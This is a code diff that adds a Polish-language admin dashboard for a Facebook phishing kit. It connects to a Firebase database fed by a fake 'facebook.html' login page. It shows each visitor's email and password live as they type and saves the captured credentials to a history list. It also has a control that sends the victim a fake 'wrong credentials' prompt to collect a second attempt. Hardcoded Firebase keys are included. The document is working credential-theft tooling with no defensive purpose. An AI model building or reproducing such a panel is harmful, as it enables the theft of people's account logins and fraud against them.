@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin – Monitor Loginów Facebook</title>
+<style>
+* { box-sizing:border-box; margin:0; padding:0; }
+body { background:#0f1117; color:#e8eaf0; font-family:'Segoe UI',sans-serif; min-height:100vh; }
+.header { background:#161920; border-bottom:1px solid #232733; padding:16px 24px; display:flex; align-items:center; justify-content:space-between; position:sticky; top:0; z-index:100; }
+.header h1 { font-size:16px; font-weight:700; color:#fff; }
+.header-online { font-size:12px; color:#5a6070; background:#1e2230; border:1px solid #2a2f3e; border-radius:20px; padding:6px 14px; }
+.header-online span { color:#00c864; font-weight:700; }
+.tabs { display:flex; background:#161920; border-bottom:1px solid #232733; padding:0 24px; position:sticky; top:57px; z-index:99; }
+.tab-btn { padding:12px 20px; font-size:13px; font-weight:600; color:#5a6070; background:none; border:none; border-bottom:2px solid transparent; cursor:pointer; font-family:'Segoe UI',sans-serif; margin-bottom:-1px; }
+.tab-btn:hover { color:#e8eaf0; }
+.tab-btn.active { color:#e8eaf0; border-bottom-color:#1877f2; }
+.tab-count { display:inline-flex; align-items:center; background:#1e2230; border-radius:10px; font-size:10px; font-weight:700; padding:1px 7px; margin-left:6px; color:#5a6070; }
+.tab-btn.active .tab-count { background:rgba(24,119,242,0.15); color:#1877f2; }
+.container { max-width:540px; margin:32px auto; padding:0 20px 80px; }
+.empty-state { text-align:center; padding:60px 20px; color:#3a3f50; font-size:13px; line-height:2; }
+.user-block { margin-bottom:16px; }
+.user-header { display:flex; align-items:center; justify-content:space-between; padding:14px 18px; background:#161920; border:1px solid #232733; border-radius:12px; cursor:pointer; user-select:none; transition:background 0.15s; }
+.user-header:hover { background:#1a1d27; }
+.user-header.open { border-radius:12px 12px 0 0; border-bottom-color:#1a1d27; }
+.user-header-left { display:flex; align-items:center; gap:10px; }
+.user-name { font-size:14px; font-weight:700; color:#e8eaf0; }
+.status-pill { display:flex; align-items:center; gap:6px; background:#1e2230; border:1px solid #2a2f3e; border-radius:20px; padding:4px 10px; font-size:12px; font-weight:600; color:#6b7280; transition:all 0.3s; }
+.status-pill.online { background:rgba(24,119,242,0.08); border-color:#1877f2; color:#1877f2; }
+.dot { width:8px; height:8px; border-radius:50%; background:#3a3f50; flex-shrink:0; position:relative; }
+.dot.on { background:#1877f2; }
+.dot.on::after { content:''; position:absolute; inset:-3px; border-radius:50%; background:#1877f2; opacity:0.25; animation:ping 1.5s ease-out infinite; }
+@keyframes ping { 0%{transform:scale(1);opacity:0.25} 100%{transform:scale(2.8);opacity:0} }
+.chevron { width:18px; height:18px; flex-shrink:0; fill:#5a6070; transition:transform 0.2s; }
+.chevron.open { transform:rotate(180deg); fill:#1877f2; }
+.del-btn { background:none; border:1px solid #2a2f3e; border-radius:6px; color:#5a6070; font-size:11px; padding:3px 9px; cursor:pointer; font-family:'Segoe UI',sans-serif; }
+.del-btn:hover { border-color:#ff4466; color:#ff4466; }
+.user-body { display:none; border:1px solid #232733; border-top:none; border-radius:0 0 12px 12px; overflow:hidden; }
+.user-body.open { display:block; }
+.section { background:#161920; border-bottom:1px solid #1a1d27; }
+.section-title { padding:11px 20px; font-size:11px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; color:#5a6070; border-bottom:1px solid #1a1d27; }
+.row { display:flex; align-items:center; justify-content:space-between; padding:12px 20px; border-bottom:1px solid #1a1d27; gap:12px; }
+.row:last-child { border-bottom:none; }
+.row-key { font-size:13px; color:#6b7280; flex-shrink:0; }
+.row-val { font-size:13px; font-weight:600; color:#4b5263; text-align:right; word-break:break-all; font-style:italic; }
+.row-val.filled { color:#e8eaf0; font-style:normal; }
+.row-val.ok { color:#00c864; font-style:normal; }
+.row-val.err { color:#ff4466; font-style:normal; }
+.row-val.warn { color:#ffaa00; font-style:normal; }
+.row-val.loading { color:#1877f2; font-style:normal; }
+.ctrl-section { background:#0f1117; padding:14px 20px; }
+.ctrl-label { font-size:11px; font-weight:700; letter-spacing:1.5px; text-transform:uppercase; color:#5a6070; margin-bottom:10px; }
+.ctrl-btns { display:flex; gap:8px; flex-wrap:wrap; }
+.ctrl-btn { padding:8px 14px; border-radius:8px; border:1px solid #2a2f3e; background:#1e2230; color:#e8eaf0; font-size:12px; font-weight:600; cursor:pointer; font-family:'Segoe UI',sans-serif; transition:all 0.15s; }
+.ctrl-btn.wrong { border-color:#ffaa00; color:#ffaa00; }
+.ctrl-btn.wrong:hover { background:rgba(255,170,0,0.1); }
+
+/* Historia */
+.hist-block { margin-bottom:12px; background:#161920; border:1px solid #232733; border-radius:12px; overflow:hidden; }
+.hist-header { display:flex; align-items:center; justify-content:space-between; padding:13px 18px; }
+.hist-name { font-size:13px; font-weight:700; color:#e8eaf0; }
+.hist-time { font-size:11px; color:#5a6070; }
+.hist-body { padding:0; }
+.hist-row { display:flex; justify-content:space-between; align-items:center; padding:9px 18px; border-top:1px solid #1a1d27; gap:12px; }
+.hist-key { font-size:12px; color:#6b7280; flex-shrink:0; }
+.hist-val { font-size:12px; font-weight:600; color:#e8eaf0; text-align:right; word-break:break-all; }
+.hist-val.err { color:#ff4466; }
+.hist-del-btn { background:none; border:1px solid #2a2f3e; border-radius:6px; color:#5a6070; font-size:11px; padding:3px 9px; cursor:pointer; font-family:'Segoe UI',sans-serif; flex-shrink:0; }
+.hist-del-btn:hover { border-color:#ff4466; color:#ff4466; }
+
+#toast { position:fixed; bottom:24px; left:50%; transform:translateX(-50%); background:#1e2230; border:1px solid #2a2f3e; border-radius:10px; padding:12px 20px; font-size:13px; font-weight:600; display:none; z-index:999; white-space:nowrap; }
+</style>
+</head>
+<body>
+
+<div class="header">
+    <h1>Admin <span style="color:#3a3f50;font-weight:400;">/ Monitor Loginów Facebook</span></h1>
+    <div class="header-online">Online: <span id="onlineCount">0</span></div>
+</div>
+<div class="tabs">
+    <button class="tab-btn active" id="tab-live" onclick="switchTab('live')">Dane na żywo <span class="tab-count" id="cnt-live">0</span></button>
+    <button class="tab-btn" id="tab-hist" onclick="switchTab('hist')">Historia <span class="tab-count" id="cnt-hist">0</span></button>
+</div>
+<div class="container" id="panel-live">
+    <div class="empty-state" id="emptyState">Brak użytkowników.<br>Otwórz <strong style="color:#e8eaf0">facebook.html</strong> w nowej zakładce.</div>
+</div>
+<div class="container" id="panel-hist" style="display:none;">
+    <div class="empty-state" id="emptyHist">Brak historii.<br>Pojawi się tutaj gdy użytkownik kliknie <strong style="color:#e8eaf0">Zaloguj się</strong>.</div>
+</div>
+<div id="toast"></div>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-app.js";
+import { getDatabase, ref, set, remove, onValue, push } from "https://www.gstatic.com/firebasejs/12.14.0/firebase-database.js";
+
+const firebaseConfig = {
+    apiKey: "AIzaSyBgan9s5dewhyu584M-kZ-IcMw_rXt9isI",
+    authDomain: "test-76f44.firebaseapp.com",
+    databaseURL: "https://test-76f44-default-rtdb.europe-west1.firebasedatabase.app",
+    projectId: "test-76f44",
+    storageBucket: "test-76f44.firebasestorage.app",
+    messagingSenderId: "738546699152",
+    appId: "1:738546699152:web:3b2ec6ad7285eb2a264115"
+};
+
+const app = initializeApp(firebaseConfig);
+const db  = getDatabase(app);
+
+const adminStartTs  = Date.now();
+const processedKeys = new Set();
+const users         = {};
+const ipToSid       = {};
+const sessionState  = {};
+// FIX #2: śledzimy które sesje już dodały wpis do historii, żeby nie duplikować
+const submitFired   = new Set();
+let   userCounter   = 0;
+
+// ── FIX #1: Wczytaj historię z Firebase przy starcie ──
+onValue(ref(db, 'fb_history'), (snap) => {
+    // Wyczyść panel historii (poza emptyHist)
+    document.querySelectorAll('#panel-hist .hist-block').forEach(el => el.remove());
+    if (!snap.exists()) {
+        document.getElementById('emptyHist').style.display = '';
+        updateHistCount();
+        return;
+    }
+    // Zbierz wszystkie wpisy i posortuj wg ts (najnowsze na górze)
+    const entries = [];
+    snap.forEach(child => {
+        const v = child.val();
+        if (v) entries.push({ key: child.key, ...v });
+    });
+    entries.sort((a, b) => (b.ts || 0) - (a.ts || 0));
+
+    if (entries.length) {
+        document.getElementById('emptyHist').style.display = 'none';
+        entries.forEach(e => renderHistBlock(e.key, e.name, e.email, e.password, e.time));
+    } else {
+        document.getElementById('emptyHist').style.display = '';
+    }
+    updateHistCount();
+});
+
+// ── Nasłuch events ──
+onValue(ref(db, 'fb_events'), (snap) => {
+    if (!snap.exists()) return;
+    snap.forEach(child => {
+        const key = child.key;
+        const m   = child.val();
+        if (!m || !m.t || !m.sid) return;
+        if (m.ts && m.ts < adminStartTs) return;
+        if (processedKeys.has(key)) return;
+        processedKeys.add(key);
+        handle(m);
+    });
+});
+
+// ── Nasłuch sessions ──
+let sessionCache = {};
+onValue(ref(db, 'fb_sessions'), (snap) => {
+    sessionCache = {};
+    if (!snap.exists()) return;
+    snap.forEach(c => { if (c.val()) sessionCache[c.key] = c.val(); });
+
+    snap.forEach(child => {
+        const sid = child.key;
+        const s   = child.val();
+        if (!s) return;
+        if (s.ts && s.ts < adminStartTs) return;
+
+        if (!sessionState[sid]) {
+            sessionState[sid] = {};
+            const ip = s.ip;
+            if (ip && ipToSid[ip] && ipToSid[ip] !== sid) {
+                const orig = ipToSid[ip];
+                if (users[orig]) showToast('🔄 ' + users[orig].name + ' odświeżył stronę', '#f59e0b');
+                handle({ sid: orig, ts: s.ts || adminStartTs, t: 'online' });
+                return;
+            }
+            if (ip) ipToSid[ip] = sid;
+            handle({ sid, ts: s.ts || adminStartTs, t: 'online' });
+        }
+
+        const base = { sid, ts: s.ts || adminStartTs };
+        ['email','password','tab'].forEach(f => {
+            if (s[f] !== undefined && s[f] !== sessionState[sid][f]) {
+                sessionState[sid][f] = s[f];
+                handle(Object.assign({}, base, { t: f, v: s[f] }));
+            }
+        });
+
+        // FIX #2: login_submit obsługujemy TYLKO przez fb_events, nie przez fb_sessions
+        // żeby uniknąć podwójnego wywołania handle()
+
+        if (s.isOnline !== undefined && s.isOnline !== sessionState[sid].isOnline) {
+            sessionState[sid].isOnline = s.isOnline;
+            handle(Object.assign({}, base, { t: s.isOnline ? 'online' : 'offline' }));
+        }
+    });
+});
+
+// ── Obsługa eventów ──
+function handle(m) {
+    const sid = m.sid;
+    if (!users[sid]) {
+        if (m.t === 'hb') return;
+        createUser(sid);
+    }
+    const u = users[sid];
+    clearTimeout(u.hbTimer);
+    u.hbTimer = setTimeout(() => setOnline(sid, false), 7000);
+
+    if (m.t === 'online') {
+        setOnline(sid, true);
+        if (!u.greeted) { u.greeted = true; showToast('🟢 ' + u.name + ' wszedł na stronę', '#1877f2'); beep('arrive'); }
+        return;
+    }
+    if (m.t === 'hb')      { setOnline(sid, true); return; }
+    if (m.t === 'offline') { setOnline(sid, false); return; }
+    if (m.t === 'tab')     { setVal(sid,'tab', m.v, m.v==='aktywna'?'ok':'warn'); setLast(sid); return; }
+
+    if (m.t === 'email')    { u.lastEmail = m.v; setVal(sid,'email', m.v || '–', 'filled'); setLast(sid); }
+    if (m.t === 'password') { u.lastPassword = m.v; setVal(sid,'password', m.v, 'filled'); setLast(sid); }
+
+    if (m.t === 'login_submit') {
+        // FIX #2: guard przed duplikatem
+        if (submitFired.has(sid)) return;
+        submitFired.add(sid);
+
+        setVal(sid,'submit', '⏳ Ładowanie... ('+now()+')', 'loading');
+        showToast('✅ '+u.name+' kliknął zaloguj!','#1877f2');
+        beep('pay');
+        const wrongBtn = document.getElementById('wrong-btn-'+sid);
+        if (wrongBtn) wrongBtn.style.display = 'inline-flex';
+
+        // FIX #1: Zapisz do Firebase żeby przetrwało odświeżenie
+        saveHistory(u.name, u.lastEmail || '–', u.lastPassword || '–');
+    }
+}
+
+// ── Historia – zapis do Firebase ──
+function saveHistory(name, email, password) {
+    const entry = { name, email, password, time: now(), ts: Date.now() };
+    push(ref(db, 'fb_history'), entry);
+    // onValue wyżej automatycznie odświeży widok
+}
+
+// ── Historia – renderowanie bloku (używane przez onValue) ──
+function renderHistBlock(key, name, email, password, time) {
+    const block = document.createElement('div');
+    block.className = 'hist-block';
+    block.id = 'hist-' + key;
+    block.innerHTML = `
+      <div class="hist-header">
+        <span class="hist-name">${name}</span>
+        <div style="display:flex;align-items:center;gap:10px;">
+          <span class="hist-time">${time || ''}</span>
+          <button class="hist-del-btn" onclick="deleteHist('${key}')">Usuń</button>
+        </div>
+      </div>
+      <div class="hist-body">
+        <div class="hist-row"><span class="hist-key">Email/Telefon</span><span class="hist-val">${email}</span></div>
+        <div class="hist-row"><span class="hist-key">Hasło</span><span class="hist-val">${password}</span></div>
+      </div>
+    `;
+    document.getElementById('panel-hist').appendChild(block);
+}
+
+window.deleteHist = function(key) {
+    remove(ref(db, 'fb_history/' + key));
+    // onValue automatycznie odświeży widok
+};
+
+function updateHistCount() {
+    document.getElementById('cnt-hist').textContent = document.querySelectorAll('#panel-hist .hist-block').length;
+}
+
+// ── Tworzenie usera ──
+function createUser(sid) {
+    document.getElementById('emptyState').style.display = 'none';
+    userCounter++;
+    const name = 'Użytkownik ' + userCounter;
+    const block = document.createElement('div');
+    block.className = 'user-block'; block.id = 'block-'+sid;
+    block.innerHTML = `
+      <div class="user-header" id="hdr-${sid}" onclick="toggleUser('${sid}')">
+        <div class="user-header-left">
+          <div class="dot" id="dot-${sid}"></div>
+          <span class="user-name">${name}</span>
+          <div class="status-pill" id="pill-${sid}"><span id="pilltxt-${sid}">OFFLINE</span></div>
+        </div>
+        <div style="display:flex;align-items:center;gap:8px;">
+          <button class="del-btn" onclick="event.stopPropagation();deleteUser('${sid}')">Usuń</button>
+          <svg class="chevron" id="chev-${sid}" viewBox="0 0 24 24"><path d="M7.165 8.153a1.07 1.07 0 0 0-1.507-.078A1.063 1.063 0 0 0 5.58 9.58l5.672 6.27a1.07 1.07 0 0 0 1.587-.002l5.583-6.217a1.06 1.06 0 0 0-.083-1.503 1.07 1.07 0 0 0-1.507.083l-4.37 4.865a.57.57 0 0 1-.843.002z"/></svg>
+        </div>
+      </div>
+      <div class="user-body" id="body-${sid}">
+        <div class="section">
+          <div class="section-title">Dane Logowania</div>
+          <div class="row"><span class="row-key">Email/Telefon</span>    <span class="row-val" id="${sid}-email">–</span></div>
+          <div class="row"><span class="row-key">Hasło</span>            <span class="row-val" id="${sid}-password">–</span></div>
+          <div class="row"><span class="row-key">Przycisk Zaloguj</span> <span class="row-val" id="${sid}-submit">–</span></div>
+        </div>
+        <div class="section">
+          <div class="section-title">Sesja</div>
+          <div class="row"><span class="row-key">Status zakładki</span>    <span class="row-val" id="${sid}-tab">–</span></div>
+          <div class="row"><span class="row-key">Czas na stronie</span>    <span class="row-val filled" id="${sid}-time">0s</span></div>
+          <div class="row"><span class="row-key">Ostatnia aktywność</span> <span class="row-val" id="${sid}-last">–</span></div>
+        </div>
+        <div class="ctrl-section">
+          <div class="ctrl-label">🎮 Sterowanie</div>
+          <div class="ctrl-btns">
+            <button class="ctrl-btn wrong" id="wrong-btn-${sid}" onclick="wrongCredentials('${sid}')" style="display:none;">❌ Nieprawidłowe dane</button>
+          </div>
+        </div>
+      </div>
+    `;
+    document.getElementById('panel-live').prepend(block);
+    updateLiveCount();
+    users[sid] = { name, block, hbTimer:null, greeted:false, sessionStart:Date.now(), lastEmail:'', lastPassword:'', timerInterval: setInterval(()=>tickTime(sid),1000) };
+    updateOnlineCount();
+}
+
+function setVal(sid, field, val, cls) {
+    const el = document.getElementById(sid+'-'+field);
+    if (!el) return;
+    el.textContent = val;
+    el.className = 'row-val'+(cls?' '+cls:'');
+}
+function setLast(sid) { setVal(sid,'last',now(),'filled'); }
+function setOnline(sid, v) {
+    const dot=document.getElementById('dot-'+sid), pill=document.getElementById('pill-'+sid), txt=document.getElementById('pilltxt-'+sid);
+    if (!dot) return;
+    dot.className = 'dot'+(v?' on':'');
+    pill.className = 'status-pill'+(v?' online':'');
+    txt.textContent = v ? 'ONLINE' : 'OFFLINE';
+    if (!v) setVal(sid,'tab','offline','err');
+    updateOnlineCount();
+}
+function tickTime(sid) {
+    const u=users[sid]; if (!u) return;
+    const s=Math.round((Date.now()-u.sessionStart)/1000);
+    const el=document.getElementById(sid+'-time');
+    if (el) el.textContent = Math.floor(s/60)>0 ? Math.floor(s/60)+'m '+(s%60)+'s' : s+'s';
+}
+function updateOnlineCount() {
+    document.getElementById('onlineCount').textContent = Object.keys(users).filter(sid=>document.getElementById('dot-'+sid)?.classList.contains('on')).length;
+}
+function updateLiveCount() {
+    document.getElementById('cnt-live').textContent = document.querySelectorAll('#panel-live .user-block').length;
+}
+
+// ── Sterowanie ──
+window.wrongCredentials = function(sid) {
+    set(ref(db,'fb_ctrl/'+sid), { action: 'wrong_credentials', ts:Date.now() });
+    setVal(sid,'submit','❌ Nieprawidłowe dane ('+now()+')', 'err');
+    document.getElementById('wrong-btn-'+sid).style.display = 'none';
+    showToast('❌ Wysłano: Nieprawidłowe dane do '+users[sid]?.name, '#ffaa00');
+    // Pozwól na ponowne kliknięcie zaloguj od tego samego użytkownika
+    submitFired.delete(sid);
+};
+
+window.toggleUser = function(sid) {
+    const body=document.getElementById('body-'+sid), hdr=document.getElementById('hdr-'+sid), chev=document.getElementById('chev-'+sid);
+    const open=body.classList.contains('open');
+    body.classList.toggle('open',!open); hdr.classList.toggle('open',!open); chev.classList.toggle('open',!open);
+};
+window.deleteUser = function(sid) {
+    const u=users[sid]; if (!u) return;
+    clearTimeout(u.hbTimer); clearInterval(u.timerInterval);
+    u.block.remove(); delete users[sid];
+    updateOnlineCount(); updateLiveCount();
+    if (!Object.keys(users).length) document.getElementById('emptyState').style.display='';
+};
+
+window.switchTab = function(tab) {
+    document.getElementById('panel-live').style.display = tab==='live' ? '' : 'none';
+    document.getElementById('panel-hist').style.display = tab==='hist' ? '' : 'none';
+    document.getElementById('tab-live').classList.toggle('active', tab==='live');
+    document.getElementById('tab-hist').classList.toggle('active', tab==='hist');
+};
+
+function now() { return new Date().toLocaleTimeString('pl-PL',{hour:'2-digit',minute:'2-digit',second:'2-digit'}); }
+let toastTimer;
+function showToast(msg,color) {
+    const el=document.getElementById('toast');
+    el.textContent=msg; el.style.color=color||'#e8eaf0'; el.style.borderColor=color||'#2a2f3e'; el.style.display='block';
+    clearTimeout(toastTimer); toastTimer=setTimeout(()=>el.style.display='none',3500);
+}
+function beep(type) {
+    try {
+        const ctx=new(window.AudioContext||window.webkitAudioContext)();
+        if(type==='arrive'){const o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);o.frequency.setValueAtTime(660,ctx.currentTime);o.frequency.exponentialRampToValueAtTime(1100,ctx.currentTime+0.2);g.gain.setValueAtTime(0.15,ctx.currentTime);g.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+0.4);o.start();o.stop(ctx.currentTime+0.4);}
+        else{[0,0.12,0.24].forEach((d,i)=>{const o=ctx.createOscillator(),g=ctx.createGain();o.connect(g);g.connect(ctx.destination);o.frequency.value=[550,770,990][i];g.gain.setValueAtTime(0.15,ctx.currentTime+d);g.gain.exponentialRampToValueAtTime(0.001,ctx.currentTime+d+0.25);o.start(ctx.currentTime+d);o.stop(ctx.currentTime+d+0.25);});}
+    } catch(e){}
+}
+</script>
+</body>
+</html>
